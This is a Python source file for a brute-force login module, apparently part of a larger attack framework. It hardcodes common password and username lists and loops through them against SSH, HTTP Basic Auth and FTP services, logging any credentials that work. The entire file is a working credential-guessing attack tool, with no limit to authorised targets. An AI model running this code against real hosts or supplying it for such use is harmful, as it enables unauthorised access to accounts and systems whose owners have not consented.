import paramiko
import requests
from requests.auth import HTTPBasicAuth
from .attack_base import AttackBase
from ..utils.logger import setup_logger

logger = setup_logger('brute_force')

class BruteForceAttack(AttackBase):
    """Brute Force Authentication Attack"""
    
    def __init__(self):
        super().__init__(
            name="Brute Force",
            description="Authentication brute force attack"
        )
        
        # Common passwords
        self.passwords = [
            'password', '123456', '12345678', 'qwerty', 'abc123',
            'monkey', '1234567', 'letmein', 'trustno1', 'dragon',
            'baseball', '111111', 'iloveyou', 'master', 'sunshine',
            'ashley', 'bailey', 'passw0rd', 'shadow', '123123',
            'admin', 'root', 'toor', 'test', 'guest'
        ]
        
        # Common usernames
        self.usernames = [
            'admin', 'root', 'user', 'test', 'guest',
            'administrator', 'webadmin', 'sysadmin'
        ]
    
    def execute(self, target, service='ssh', port=None, username=None):
        """Execute brute force attack"""
        logger.info(f"Starting brute force on {target}:{service}")
        
        if service == 'ssh':
            return self._brute_force_ssh(target, port or 22, username)
        elif service == 'http':
            return self._brute_force_http(target, port or 80)
        elif service == 'ftp':
            return self._brute_force_ftp(target, port or 21, username)
        else:
            logger.error(f"Unsupported service: {service}")
            return {'success': False}
    
    def _brute_force_ssh(self, target, port, username=None):
        """Brute force SSH"""
        results = {
            'success': False,
            'credentials': [],
            'attempts': 0
        }
        
        usernames = [username] if username else self.usernames
        
        for user in usernames:
            for password in self.passwords:
                results['attempts'] += 1
                
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    
                    ssh.connect(
                        target,
                        port=port,
                        username=user,
                        password=password,
                        timeout=3,
                        look_for_keys=False,
                        allow_agent=False
                    )
                    
                    # Success
                    results['success'] = True
                    results['credentials'].append({
                        'username': user,
                        'password': password
                    })
                    logger.warning(f"SSH credentials found: {user}:{password}")
                    
                    ssh.close()
                    
                except paramiko.AuthenticationException:
                    logger.debug(f"Failed: {user}:{password}")
                except Exception as e:
                    logger.error(f"SSH error: {e}")
                    break
        
        logger.info(f"SSH brute force completed: {results['attempts']} attempts")
        return results
    
    def _brute_force_http(self, target, port):
        """Brute force HTTP Basic Auth"""
        results = {
            'success': False,
            'credentials': [],
            'attempts': 0
        }
        
        url = f"http://{target}:{port}"
        
        for user in self.usernames:
            for password in self.passwords:
                results['attempts'] += 1
                
                try:
                    response = requests.get(
                        url,
                        auth=HTTPBasicAuth(user, password),
                        timeout=3
                    )
                    
                    if response.status_code == 200:
                        results['success'] = True
                        results['credentials'].append({
                            'username': user,
                            'password': password
                        })
                        logger.warning(f"HTTP credentials found: {user}:{password}")
                    
                except Exception as e:
                    logger.error(f"HTTP error: {e}")
                    break
        
        return results
    
    def _brute_force_ftp(self, target, port, username=None):
        """Brute force FTP"""
        from ftplib import FTP
        
        results = {
            'success': False,
            'credentials': [],
            'attempts': 0
        }
        
        usernames = [username] if username else self.usernames
        
        for user in usernames:
            for password in self.passwords:
                results['attempts'] += 1
                
                try:
                    ftp = FTP()
                    ftp.connect(target, port, timeout=3)
                    ftp.login(user, password)
                    
                    results['success'] = True
                    results['credentials'].append({
                        'username': user,
                        'password': password
                    })
                    logger.warning(f"FTP credentials found: {user}:{password}")
                    
                    ftp.quit()
                    
                except Exception as e:
                    logger.debug(f"FTP failed: {user}:{password}")
        
        return results
